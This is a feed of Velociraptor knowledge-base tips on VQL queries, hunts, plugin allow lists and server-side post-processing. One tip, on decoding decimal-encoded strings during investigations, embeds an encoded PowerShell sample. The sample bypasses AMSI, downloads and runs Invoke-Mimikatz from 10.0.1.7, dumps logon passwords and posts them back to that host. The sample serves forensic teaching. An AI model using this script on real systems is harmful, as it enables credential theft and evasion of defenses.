 LET PostProcess(ClientId, FlowId) = SELECT *
 FROM foreach(row={
 SELECT parse_json(data=Stdout) AS Row
 FROM execve(argv=[&amp;quot;python.exe&amp;quot;, &amp;quot;C:/MyScript.py&amp;quot;,
 GetPath(ClientId=ClientId, FlowId=FlowId)])
 },
 column=&amp;quot;Row&amp;quot;)

 LET _GetPath(ClientId, FlowId) = SELECT file_store(path=Data.VFSPath) AS Path
 FROM enumerate_flow(client_id=ClientId, flow_id=FlowId)
 WHERE Type = &amp;quot;Result&amp;quot;
 AND Path =~ &amp;quot;BasicInformation&amp;quot;

 LET GetPath(ClientId, FlowId) = _GetPath(ClientId=ClientId, FlowId=FlowId)[0].Path

 SELECT *
 FROM foreach(row=Completions,
 query={
 SELECT *
 FROM PostProcess(ClientId=ClientId, FlowId=FlowId)
 })
&lt;/code>&lt;/pre>
&lt;p>I can add it and install it as a server event monitor. Then each time I
collect &lt;code>Generic.Client.Info&lt;/code> the artifact will automatically post
process the results.&lt;/p>
&lt;p>











&lt;figure id="2a5ec0db8b2763a78c26422a56a4c32d">
 &lt;div data-featherlight="#2a5ec0db8b2763a78c26422a56a4c32d" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/post_process_with_external_program/server_event_artifact.png" alt="Post processing the collections with Python!">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="server_event_artifact.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Post processing the collections with Python!
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>This quick example shows how to automatically post process collections
with external programs. You need to be able to shell out to the
external program which will run on the server. We used Python in this
example just for illustration purposes but you can use any language to
write the external program.&lt;/p>
&lt;p>You can also use &lt;code>watch_monitoring()&lt;/code> with the name of the new
artifact to watch for post processed results as well! &amp;hellip; &lt;code>We need to go deeper!&lt;/code> - for example use &lt;code>Elastic.Events.Upload&lt;/code> to upload those
to Elastic.&lt;/p></description></item><item><title>Set operations in VQL</title><link>https://docs.velociraptor.app/knowledge_base/tips/set_operations/</link><pubDate>Mon, 16 Dec 2024 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/set_operations/</guid><description>&lt;h1 id="set-operations-in-vql">Set operations in VQL&lt;/h1>
&lt;p>Set operations are useful in a number of useful scenarios.&lt;/p>
&lt;h2 id="what-are-sets">What are sets?&lt;/h2>
&lt;p>Sets are a mathematical construct that allows &lt;code>set operations&lt;/code> on
groups of values. In VQL sets are analogous to dictionaries with the
key being the set member and the values ignored (usually just set to
&lt;code>TRUE&lt;/code>). Set operations are emulated using dict addition and
subtraction.&lt;/p>
&lt;p>For example consider the following VQL&lt;/p>
&lt;pre>&lt;code class="language-sql">
// Convert a list into a dict for set operations
LET SET(LIST) = to_dict(item={
 SELECT _value AS _key, TRUE AS _value FROM foreach(row=LIST)
})

// Convert a dict into a list of keys
LET KEYS(X) = items(item=X)._key

LET X &amp;lt;= SET(LIST=[&amp;quot;A&amp;quot;, &amp;quot;B&amp;quot;])
LET Y &amp;lt;= SET(LIST=[&amp;quot;A&amp;quot;, &amp;quot;C&amp;quot;])

SELECT X + Y AS Union,
 KEYS(X=X+Y) AS UnionKeys,
 X - Y AS Intersection,
 KEYS(X=X-Y) AS IntersectionKeys,
 X.A AS Membership,
 get(field=&amp;quot;A&amp;quot;, item=X) AS Membership2
FROM scope()
&lt;/code>&lt;/pre>
&lt;p>In the above example, we define a helper function &lt;code>SET()&lt;/code> to create a
dict from an array by iterating over each element of the array, and
setting the value to TRUE.&lt;/p>
&lt;p>A &lt;code>Set Union&lt;/code> operation is the combination of all keys in the first
set and the second set. This is achieved by adding the
dicts. Similarly a &lt;code>Set Difference&lt;/code> removes keys present in the second
set from the first set. This is implemented by subtracting the second
set from the first set.&lt;/p>
&lt;p>Set membership check can be done by simply checking if the dict
contains the value. This can be done directly when the key name is
known in advance, or by using the &lt;code>get()&lt;/code> function to access the named
field.&lt;/p>
&lt;p>











&lt;figure id="137c2bd7b155a326937ab60b930f696f">
 &lt;div data-featherlight="#137c2bd7b155a326937ab60b930f696f" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/set_operations/set_operations.png" alt="Set Operations in VQL">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="set_operations.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Set Operations in VQL
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="using-set-operations-in-vql">Using Set operations in VQL&lt;/h2>
&lt;p>An example use case is in responding to a number of distinct artifact
collections. For example, for post processing the results of some
collections.&lt;/p>
&lt;p>Generally to respond to server events we need to write a
&lt;code>SERVER_EVENT&lt;/code> artifact that watches for certain events on the
server. In this case we watch for events from the
&lt;code>System.Flow.Completion&lt;/code> artifact, this artifact emits the flow object
from each flow containing a list of &lt;code>artifacts_with_results&lt;/code>.&lt;/p>
&lt;pre>&lt;code class="language-vql">LET SET(LIST) = to_dict(item={
 SELECT _value AS _key, TRUE AS _value FROM foreach(row=LIST)
})

LET FlowsToWatch &amp;lt;= SET(LIST=[&amp;quot;Generic.Client.Info/Users&amp;quot;,
 &amp;quot;Generic.Client.Info/WindowsInfo&amp;quot;])

SELECT Flow
FROM watch_monitoring(artifact=&amp;quot;System.Flow.Completion&amp;quot;)
WHERE any(items=Flow.artifacts_with_results, filter=&amp;quot;x=&amp;gt;get(item=FlowsToWatch, field=x)&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>The above query prepares a set into the variable &lt;code>FlowsToWatch&lt;/code>. The
query then filters out all flows except those that contain results
from the set of interest.&lt;/p>
&lt;p>An alternative to the previous query is to use a regular expression
(This solution is more flexible as it allows matching artifact names
by regular expressions):&lt;/p>
&lt;pre>&lt;code class="language-vql">LET FlowsToWatch &amp;lt;= join(array=[&amp;quot;Generic.Client.Info/Users&amp;quot;,
 &amp;quot;Generic.Client.Info/WindowsInfo&amp;quot;], sep=&amp;quot;|&amp;quot;)

SELECT Flow
FROM watch_monitoring(artifact=&amp;quot;System.Flow.Completion&amp;quot;)
WHERE Flow.artifacts_with_results =~ FlowsToWatch
&lt;/code>&lt;/pre>
&lt;p>This works because a regular expression match on an array is true if
any of the members of the array match.&lt;/p></description></item><item><title>How do I get a list of hunts across multiple organizations?</title><link>https://docs.velociraptor.app/knowledge_base/tips/multi_org/</link><pubDate>Fri, 06 Dec 2024 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/multi_org/</guid><description>&lt;h1 id="how-do-i-get-a-list-of-hunts-across-multiple-organizations">How do I get a list of hunts across multiple organizations?&lt;/h1>
&lt;p>Are you looking for a way to generate user metrics across the entire server (like Hunts run per user)?&lt;/p>
&lt;p>Orgs are separated out so when you run a query you are running that query within the context of the org. Normally the hunts scheduled in an organization can be accessed using the &lt;a href="https://docs.velociraptor.app/vql_reference/server/hunts/" target="_blank" >hunts()&lt;/a>
 plugin, but that normally acts within a single Org.&lt;/p>
&lt;p>To run a query in another org, you can switch org contexts using the &lt;a href="https://docs.velociraptor.app/vql_reference/misc/query/" target="_blank" >query()&lt;/a>
 plugin.&lt;/p>
&lt;p>So for example to see all hunts in all orgs:&lt;/p>
&lt;pre>&lt;code class="language-sql">SELECT * FROM foreach(
 row={
 SELECT OrgId FROM orgs()
 },
 query={
 SELECT * FROM query(query={
 SELECT * FROM hunts()
 }, org_id=OrgId)
 })
&lt;/code>&lt;/pre>
&lt;p>This query iterates over all the orgs, then runs the &lt;code>SELECT * FROM hunts()&lt;/code> query within the org context.&lt;/p>
&lt;p>You can simplify the query using LET stored queries:&lt;/p>
&lt;pre>&lt;code class="language-sql">LET MyQuery = SELECT * FROM hunts()
LET AllOrgs = SELECT OrgId FROM orgs()

SELECT * FROM foreach(row=AllOrgs,
 query={
 SELECT * FROM query(query=MyQuery, org_id=OrgId)
 })
&lt;/code>&lt;/pre>
&lt;p>Of course your user account must have access to the orgs. Each org has a separate ACL for each user, so your user needs to have at least the &lt;code>READ_RESULTS&lt;/code> permission to be able to see the org.&lt;/p>
&lt;p>Some plugins (e.g. &lt;a href="https://docs.velociraptor.app/vql_reference/server/hunt/" target="_blank" >hunt()&lt;/a>
 ) support orgs directly for convenience but generally you should use the above approach. This will also remind you that each such query is running in a separate org context and therefore can not see other data at the same time.&lt;/p></description></item><item><title>Error "Parameter refers to an unknown artifact" when collecting a CLIENT artifact</title><link>https://docs.velociraptor.app/knowledge_base/tips/collect_artifact_unknown/</link><pubDate>Sat, 31 Aug 2024 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/collect_artifact_unknown/</guid><description>&lt;h1 id="error-parameter-refers-to-an-unknown-artifact-when-collecting-a-client-artifact">Error &amp;ldquo;Parameter refers to an unknown artifact&amp;rdquo; when collecting a CLIENT artifact&lt;/h1>
&lt;p>Before an artifact is collected from the client, the artifact is
compiled into a VQL request by the artifact compiler. This actually
transforms the vql and injects dependent artifacts into the request so
the client can evaluate it. The client&amp;rsquo;s VQL engine will &lt;strong>never&lt;/strong> use
built in artifacts and must always have artifacts injected in the request.&lt;/p>
&lt;p>The reason for that is that if an artifact is updated on the server
(e.g. by upgrading the server or edit the custom artifact) the client
must be given the latest version of the artifact.&lt;/p>
&lt;p>When the VQL compiler sees a statement like:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * FROM Artifact.Dependant.Artifact()
&lt;/code>&lt;/pre>
&lt;p>It will recognize the the the VQL is dependent on the artifact
&lt;code>Dependent.Artifact&lt;/code> and will inject it into the VQL request. You can
see this in the &lt;code>Request&lt;/code> tab - the &lt;code>artifacts&lt;/code> section of the request
will include dependent artifact definitions (in this case the artifact
calls &lt;code>Generic.Utils.FetchBinary&lt;/code>).&lt;/p>
&lt;pre>&lt;code class="language-json">[
 {
 &amp;quot;session_id&amp;quot;: &amp;quot;F.CR3B2IIN3E8GK&amp;quot;,
 &amp;quot;request_id&amp;quot;: &amp;quot;1&amp;quot;,
 &amp;quot;FlowRequest&amp;quot;: {
 &amp;quot;VQLClientActions&amp;quot;: [
 {
 &amp;quot;query_id&amp;quot;: &amp;quot;1&amp;quot;,
 &amp;quot;total_queries&amp;quot;: &amp;quot;1&amp;quot;,
 ....
 &amp;quot;artifacts&amp;quot;: [
 {
 &amp;quot;name&amp;quot;: &amp;quot;Generic.Utils.FetchBinary&amp;quot;,
 &amp;quot;parameters&amp;quot;: [
&lt;/code>&lt;/pre>
&lt;p>This issue comes up commonly in two scenarios:&lt;/p>
&lt;h3 id="using-the-vql-shell-to-collect-a-custom-artifact">Using the VQL shell to collect a custom artifact&lt;/h3>
&lt;p>In this case the GUI will collect the artifact &lt;code>Generic.Client.VQL&lt;/code>
which essentially evaluates the query provided as a string on the
client.&lt;/p>
&lt;p>Because the query is given as an opaque string parameter, the artifact
compiler does not see any dependencies and can not inject them into
the request. Built in artifacts are allowed in this case but custom
artifacts are not supported.&lt;/p>
&lt;p>If you need to collect a custom artifact from the endpoint, just
collect it as normal - do not use the VQL shell for that.&lt;/p>
&lt;h3 id="using-the-collect-plugin-on-the-client-to-prepare-a-collection-zip-file">Using the &lt;code>collect()&lt;/code> plugin on the client to prepare a collection zip file.&lt;/h3>
&lt;p>Another similar issue occurs when writing a custom artifact that uses
the &lt;code>collect()&lt;/code> plugin. Similarly because the artifacts to collect are
given as strings, the compiler has no idea these are a dependency.&lt;/p>
&lt;p>For example this VQL code&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * from collect(artifacts=['Generic.Collectors.File'],
 args=dict(`Generic.Collectors.File`=dict(`collectionSpec`=collectionSpec,
 `Root`=Root)),
 password='infected',
 output=tempzip)
&lt;/code>&lt;/pre>
&lt;p>To fix this artifact the &lt;code>Generic.Collectors.File&lt;/code> artifact must be
given as a dependency. Either include it in the artifact&amp;rsquo;s &lt;code>import&lt;/code>
section or add the following VQL statement:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET _ = SELECT * FROM Artifact.Generic.Collectors.File()
&lt;/code>&lt;/pre>
&lt;p>That statement will not actually run the artifact (it is a lazy LET
statement) but the compiler&amp;rsquo;s static analyzer will identify the
artifact as a dependency and be able to inject it into the request.&lt;/p></description></item><item><title>How do you generate random characters?</title><link>https://docs.velociraptor.app/knowledge_base/tips/random/</link><pubDate>Wed, 09 Aug 2023 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/random/</guid><description>&lt;h1 id="how-do-you-generate-random-characters">How do you generate random characters?&lt;/h1>
&lt;p>Using the rand() function we can manipulate the results to output a character set then use the WHERE condition to filter for the characters of interest.&lt;/p>
&lt;p>For example output 32 random printable characters:&lt;/p>
&lt;pre>&lt;code> LET RandomChars = SELECT format(format=&amp;quot;%c&amp;quot;, args=rand(range=255)) AS Character
 FROM range(end=9999999999)
 WHERE Character =~ &amp;quot;[ -~]&amp;quot;
 LIMIT 32

SELECT join(array=RandomChars.Character) as Characters FROM scope()
&lt;/code>&lt;/pre>
&lt;p>Modify the Character WHERE regex and LIMIT for desired results.&lt;/p>
&lt;p>











&lt;figure id="23a9199172545cdcfd9e0ad2abc64d03">
 &lt;div data-featherlight="#23a9199172545cdcfd9e0ad2abc64d03" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/random/259396221-15d5e7f3-f519-4446-bbcb-fb42d97f4197.png" alt="">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="259396221-15d5e7f3-f519-4446-bbcb-fb42d97f4197.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 
 &lt;/figcaption>
&lt;/figure>




&lt;/p></description></item><item><title>What to do about error "Plugin info not found"</title><link>https://docs.velociraptor.app/knowledge_base/tips/plugin_not_found/</link><pubDate>Fri, 05 May 2023 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/plugin_not_found/</guid><description>&lt;h1 id="what-to-do-about-error-plugin-info-not-found">What to do about error &amp;ldquo;Plugin info not found&amp;rdquo;&lt;/h1>
&lt;p>Velociraptor VQL queries can run on the server in the context of
server artifacts or notebook queries. Usually server side VQL is used
to post-process collected results, manage the server configuration,
schedule new collections etc.&lt;/p>
&lt;p>However, server side VQL can do a lot more than that - including shell
out to external binaries, read and write files on the server or
connect to external servers. In some deployments (especially shared
deployments) it is desirable to block any functionality on the server
which may interfere with other users or server security or
configuration.&lt;/p>
&lt;p>In recent Velociraptor versions the administrator can add an allow
list to the configuration file. This forces server side VQL to only
register plugins on the allow list, so potentially dangerous plugins
are not present at all (regardless of the Velociraptor permission
model).&lt;/p>
&lt;p>The configuration wizard will offer this functionality using the
question:&lt;/p>
&lt;pre>&lt;code>Do you want to restrict VQL functionality on the server?

This is useful for a shared server where users are not fully trusted.
It removes potentially dangerous plugins like execve(),filesystem access etc.
&lt;/code>&lt;/pre>
&lt;p>If you selected this during configuration you will receive these
errors in the notebook (or using the API) for any plugins not in the
allow list:&lt;/p>
&lt;pre>&lt;code>ERROR:Plugin info not found.
&lt;/code>&lt;/pre>
&lt;p>If you decide you need this particular plugin you can either add to
the allow list in the server configuration file. Or you may remove the
allow list entirely (which allows all plugins to be registered).&lt;/p></description></item><item><title>How can I convert decimal?</title><link>https://docs.velociraptor.app/knowledge_base/tips/decimaldecode/</link><pubDate>Wed, 02 Nov 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/decimaldecode/</guid><description>&lt;h1 id="how-can-i-convert-decimal">How can I convert decimal?&lt;/h1>
&lt;p>During investigation you may find logs or other data with decimal-encoded strings - we can leverage the format() function to convert to data.&lt;/p>
&lt;pre>&lt;code class="language-vql">LET decimal = ( 91,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,114,118,101,114,67,101,114,116,105,102,105,99,97,116,101,86,97,108,105,100,97,116,105,111,110,67,97,108,108,98,97,99,107,32,61,32,123,36,116,114,117,101,125,10,116,114,121,123,10,91,82,101,102,93,46,65,115,115,101,109,98,108,121,46,71,101,116,84,121,112,101,40,39,83,121,115,39,43,39,116,101,109,46,77,97,110,39,43,39,97,103,101,109,101,110,116,46,65,117,116,39,43,39,111,109,97,116,105,111,110,46,65,109,39,43,39,115,105,85,116,39,43,39,105,108,115,39,41,46,71,101,116,70,105,101,108,100,40,39,97,109,39,43,39,115,105,73,110,105,39,43,39,116,70,97,105,108,101,100,39,44,32,39,78,111,110,80,39,43,39,117,98,108,105,99,44,83,116,97,39,43,39,116,105,99,39,41,46,83,101,116,86,97,108,117,101,40,36,110,117,108,108,44,32,36,116,114,117,101,41,10,125,99,97,116,99,104,123,125,10,91,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,114,118,101,114,67,101,114,116,105,102,105,99,97,116,101,86,97,108,105,100,97,116,105,111,110,67,97,108,108,98,97,99,107,32,61,32,123,36,116,114,117,101,125,10,91,83,121,115,116,101,109,46,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,99,117,114,105,116,121,80,114,111,116,111,99,111,108,32,61,32,91,83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,121,80,114,111,116,111,99,111,108,84,121,112,101,93,39,83,115,108,51,44,84,108,115,44,84,108,115,49,49,44,84,108,115,49,50,39,10,73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,115,58,47,47,49,48,46,48,46,49,46,55,58,52,52,51,47,73,110,118,111,107,101,45,77,105,109,105,107,97,116,122,46,112,115,49,39,41,10,36,99,109,100,32,61,32,73,110,118,111,107,101,45,77,105,109,105,107,97,116,122,32,45,67,111,109,109,97,110,100,32,39,112,114,105,118,105,108,101,103,101,58,58,100,101,98,117,103,32,115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115,32,101,120,105,116,39,10,36,114,101,113,117,101,115,116,32,61,32,91,83,121,115,116,101,109,46,78,101,116,46,87,101,98,82,101,113,117,101,115,116,93,58,58,67,114,101,97,116,101,40,39,104,116,116,112,115,58,47,47,49,48,46,48,46,49,46,55,58,52,52,51,47,39,41,10,36,114,101,113,117,101,115,116,46,77,101,116,104,111,100,32,61,32,39,80,79,83,84,39,10,36,114,101,113,117,101,115,116,46,67,111,110,116,101,110,116,84,121,112,101,32,61,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,10,36,98,121,116,101,115,32,61,32,91,83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103,93,58,58,65,83,67,73,73,46,71,101,116,66,121,116,101,115,40,36,99,109,100,41,10,36,114,101,113,117,101,115,116,46,67,111,110,116,101,110,116,76,101,110,103,116,104,32,61,32,36,98,121,116,101,115,46,76,101,110,103,116,104,10,36,114,101,113,117,101,115,116,83,116,114,101,97,109,32,61,32,36,114,101,113,117,101,115,116,46,71,101,116,82,101,113,117,101,115,116,83,116,114,101,97,109,40,41,10,36,114,101,113,117,101,115,116,83,116,114,101,97,109,46,87,114,105,116,101,40,36,98,121,116,101,115,44,32,48,44,32,36,98,121,116,101,115,46,76,101,110,103,116,104,41,10,36,114,101,113,117,101,115,116,83,116,114,101,97,109,46,67,108,111,115,101,40,41,10,36,114,101,113,117,101,115,116,46,71,101,116,82,101,115,112,111,110,115,101,40,41 )

LET convert_decimal(data) = SELECT format(format='%c',args=_value) as Value FROM foreach(row=data)

SELECT join(array=convert_decimal(data=decimal).Value,sep='') as Data FROM scope()

&lt;/code>&lt;/pre>
&lt;p>






&lt;figure id="a7c1586dcc25ea266e7ea61a3ef5faf2">
 &lt;div data-featherlight="#a7c1586dcc25ea266e7ea61a3ef5faf2" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/decimaldecode/https://user-images.githubusercontent.com/13081800/199373835-a27910e7-40ea-4dcc-a818-baff4e19b40c.png" alt="image" />
 &lt;/div>
 &lt;figcaption>
 image
 &lt;/figcaption>
&lt;/figure>


&lt;/p></description></item><item><title>How do I re-collect a failed artifact in a hunt?</title><link>https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/</guid><description>&lt;h1 id="how-do-i-re-collect-a-failed-artifact-in-a-hunt">How do I re-collect a failed artifact in a hunt?&lt;/h1>
&lt;p>Sometimes collecting an artifact in a hunt does not work as
expected.&lt;/p>
&lt;p>Most commonly the issue is that the timeout or upload limit
for collecting the artifact is exceeded and Velociraptor cancels the
collection to prevent placing the endpoint under too much strain.&lt;/p>
&lt;p>How do we work around this? We can recollect the artifact only on that
failed endpoint with a few button clicks.&lt;/p>
&lt;p>In the following example I will start a collection for the &lt;code>$MFT&lt;/code> but
I will only set the timeout to 10 seconds and &lt;code>100Mb&lt;/code> uploaded.&lt;/p>
&lt;p>











&lt;figure id="0ba972a70fb6250f0ee496937816f5da">
 &lt;div data-featherlight="#0ba972a70fb6250f0ee496937816f5da" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/hunting_by_label.png" alt="Hunting for Files">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="hunting_by_label.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Hunting for Files
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>In the hunt resources screen I can specify limits for collection from
any one client. These limits are intended to set reasonable boundaries
for how much data I am expecting to collect so we do not overload the
network or the endpoint itself.&lt;/p>
&lt;p>











&lt;figure id="0236c3a1bc3ef7011b95d15fe95e50ce">
 &lt;div data-featherlight="#0236c3a1bc3ef7011b95d15fe95e50ce" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/setting_resources.png" alt="Setting resource limits">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="setting_resources.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Setting resource limits
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Clearly these limits are too small for this client because the
collection was cancelled after 10 seconds. Normally the default
timeout of 10 Minutes, but collecting such a lot of data may take
longer than that.&lt;/p>
&lt;p>











&lt;figure id="c5b5bd78121f5d048b804c18df1cc2bc">
 &lt;div data-featherlight="#c5b5bd78121f5d048b804c18df1cc2bc" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/timed_out.png" alt="Collection timed out">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="timed_out.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Collection timed out
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Although some data was transferred, not all the data was fully
collected. This might be acceptable but if this machine is really
compromised how can I recollect the same artifact?&lt;/p>
&lt;p>By inspecting the collections for each client in the &lt;code>Clients&lt;/code> tab, I
can quickly see which one failed.&lt;/p>
&lt;p>











&lt;figure id="bc4c15b33d5358cfb85ac5b40f6d57f2">
 &lt;div data-featherlight="#bc4c15b33d5358cfb85ac5b40f6d57f2" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/failed_collection.png" alt="Inspecting failed collection">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="failed_collection.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Inspecting failed collection
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Since a hunt is just a grouping of regular collections, I can navigate
to the client in the interface (by clicking the client button) and
find the hunt&amp;rsquo;s collection that failed.&lt;/p>
&lt;p>











&lt;figure id="4c00e77178b78da5f50b6eb01e57de17">
 &lt;div data-featherlight="#4c00e77178b78da5f50b6eb01e57de17" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/copy_collection.png" alt="Copying the collection">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="copy_collection.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Copying the collection
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Now I just copy the collection as normal and here I can update the
resource limits if needed (or maybe change some of the parameters).&lt;/p>
&lt;p>











&lt;figure id="828032523771120ecaa25224dc9e4ca0">
 &lt;div data-featherlight="#828032523771120ecaa25224dc9e4ca0" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/successful_collection.png" alt="Successful Collection">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="successful_collection.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Successful Collection
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Now that this collection is completed I can just look at the results
of the collections by itself or download the collection files for
further analysis.&lt;/p>
&lt;p>However, it is much more useful to keep all related collections in the
same hunt. This helps when analyzing the hunt results in the notebook
or exporting all the related files at once.&lt;/p>

&lt;div class="mynotices tip">
 &lt;div heading=" Hunts are a set of collections ">&lt;p>It is best to think of a &lt;code>hunt&lt;/code> as just a set of related artifact
collections. You can add/remove collections from this set at will.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>I am adding the new collection to the hunt manually by clicking the
&lt;code>Add to Hunt&lt;/code> button.&lt;/p>
&lt;p>











&lt;figure id="148b3895b977cdc2068a2da55191249f">
 &lt;div data-featherlight="#148b3895b977cdc2068a2da55191249f" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/manually_adding_hunt_collection.png" alt="Manually Adding the collection to the hunt">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="manually_adding_hunt_collection.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Manually Adding the collection to the hunt
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The interface shows me all hunts that collected the same artifact so I
choose which hunt to add it to.&lt;/p>
&lt;p>











&lt;figure id="1b371e4db1eaa277f42eea9c0bdaae1c">
 &lt;div data-featherlight="#1b371e4db1eaa277f42eea9c0bdaae1c" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/retry_hunt/new_hunt_collection.png" alt="The new collection is now part of the hunt">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="new_hunt_collection.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 The new collection is now part of the hunt
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Now the new successful collection is part of the hunt. I can see it as
a second entry in the client&amp;rsquo;s list.&lt;/p>

&lt;div class="mynotices note">
 &lt;div heading=" Deleting the old collection ">&lt;p>Velociraptor does not automatically delete the old failed collection
because it may still have some useful data (some data &lt;strong>was&lt;/strong>
transferred).&lt;/p>
&lt;p>If you do not want the old data any more, then just click the &lt;code>Delete Flow&lt;/code> button once a better collection is available.&lt;/p>
&lt;/div>
&lt;/div>


&lt;h2 id="using-vql">Using VQL&lt;/h2>
&lt;p>The above discussion was how to manually redo collections in the GUI
but if there are many collections, it might be easier to use VQL to do
this.&lt;/p>
&lt;pre>&lt;code class="language-vql">LET NewCollections = SELECT ClientId, FlowId,
 collect_client(client_id=ClientId,
 artifacts=Flow.request.artifacts,
 spec=Flow.request.specs,
 max_bytes=1000000000,
 timeout=600) AS NewCollection
FROM hunt_flows(hunt_id=HuntId)
WHERE Flow.state =~ &amp;quot;ERROR&amp;quot;

SELECT ClientId, NewCollection, hunt_add(
 client_id=ClientId,
 hunt_id=HuntId,
 flow_id=NewCollection.flow_id) AS Hunt
FROM NewCollections
&lt;/code>&lt;/pre>
&lt;ol>
&lt;li>
&lt;p>The &lt;code>NewCollections&lt;/code> query gets all Flows in the &lt;code>ERROR&lt;/code> state
within a hunt and schedules a new collection using the same
artifacts but increasing the maximum upload size to 1gb and timeout
to 600 seconds.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The next query adds the new collection to the hunt.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Note this query will only work after &lt;a href="https://github.com/Velocidex/velociraptor/commit/768021225bd617bb279fe424dcdf29c6d7d467b4" target="_blank" >#2067&lt;/a>
&lt;/p></description></item><item><title>How to control hunting by label groups?</title><link>https://docs.velociraptor.app/knowledge_base/tips/hunt_by_label/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/hunt_by_label/</guid><description>&lt;h1 id="how-to-control-hunting-by-label-groups">How to control hunting by label groups?&lt;/h1>
&lt;p>In Velociraptor, &lt;code>Hunts&lt;/code> are sets of the same collections across
clients. For example, a hunt for &lt;code>Scheduled Tasks&lt;/code> will automatically
collect the scheduled tasks from each client.&lt;/p>
&lt;p>When creating the hunt it is possible to target the hunt to a
&lt;code>Label&lt;/code>. This only schedules the hunt on clients that have that same
label. This is useful when collecting a lot of data which does not
make sense to collect from every machine in the fleet. For example in
the following screenshot I am limiting the heavy triaging collection
to machines with the label &lt;code>Triage&lt;/code>.&lt;/p>
&lt;p>











&lt;figure id="1912e2fbc6ef8afb41e2a31045e48e4f">
 &lt;div data-featherlight="#1912e2fbc6ef8afb41e2a31045e48e4f" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/hunt_by_label/limiting_hunts.png" alt="Limiting a hunt to a label">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="limiting_hunts.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Limiting a hunt to a label
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
